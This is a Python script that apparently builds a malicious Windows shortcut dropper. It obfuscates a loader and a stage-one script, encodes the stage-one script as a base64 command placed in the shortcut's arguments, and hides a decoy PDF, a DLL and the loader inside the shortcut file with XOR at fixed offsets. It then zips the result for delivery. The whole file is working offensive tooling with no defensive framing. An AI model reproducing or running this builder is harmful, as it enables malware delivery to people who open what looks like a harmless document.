#!/bin/env python3

import base64
import os
import subprocess

from append_file_with_enc import append_file, encode
from configs import *
import evillnk
import PyFuscation


def replace_placeholder(template, outfile, replacements):
	with open(template, 'r') as i:
		data = i.read()

	for rep in replacements:
		data = data.replace(rep, str(replacements[rep]))

	with open(outfile, 'w') as o:
		o.write(data) 


def perform_obfuscation(filename):
	obfuVAR = dict()
	obfuPARMS = dict()
	obfuFUNCs = dict()

	obfuVAR = PyFuscation.findVARs(filename) 
	PyFuscation.useSED(obfuVAR, filename)

	obfuPARMS = PyFuscation.findCustomParams(filename, obfuVAR)
	PyFuscation.useSED(obfuPARMS, filename)

	obfuFUNCs = PyFuscation.findFUNCs(filename)
	PyFuscation.useSED(obfuFUNCs, filename)


def prepare_loader(pdf_filename, dll_filename, loader_template, loader_outfile):
	pdf_length = os.path.getsize(pdf_filename)
	dll_length = os.path.getsize(dll_filename)
	replacements = dict()
	replacements[pdf_length_placeholder] = pdf_length
	replacements[dll_length_placeholder] = dll_length
	replace_placeholder(loader_template, loader_outfile, replacements)
	perform_obfuscation(loader_outfile)


def prepare_stage1(loader_filename, stage1_template, stage1_outfile):
	with open(loader_filename, 'rb') as in_file:
		data = in_file.read()
	loader_length = len(encode(data))

	replacements = dict()
	replacements[loader_length_placeholder] = loader_length
	replace_placeholder(stage1_template, stage1_outfile, replacements)
	perform_obfuscation(stage1_outfile)


def get_stage1_command(stage1_filename):
	with open(stage1_filename, 'r') as in_file:
		data = in_file.read()

	data = data.encode('utf-16-le')
	data = base64.b64encode(data)
	data = data.decode('utf-8')
	return data


def create_zip(lnk_filename, zip_filename):
	subprocess.run(['rm', '-f', zip_filename])
	subprocess.run(['zip', zip_filename, lnk_filename])


def main():
	prepare_loader(pdf_filename, dll_filename, loader_template, loader_outfile)
	prepare_stage1(loader_outfile, stage1_template, stage1_outfile)
	stage1_command = get_stage1_command(stage1_outfile)
	arguments = argument_prefix + stage1_command

	evillnk.create_lnk(lnk_filename, target, arguments, icon, icon_index)

	append_file(pdf_filename, lnk_filename, to_encode=False, xor_key='a', seek=0x3000)
	append_file(dll_filename, lnk_filename, to_encode=False, xor_key='a', seek=0x30000)
	append_file(loader_outfile, lnk_filename, to_encode=True, xor_key=None, seek=0x5e2be)

	create_zip(lnk_filename, zip_filename)


if __name__ == '__main__':
	main()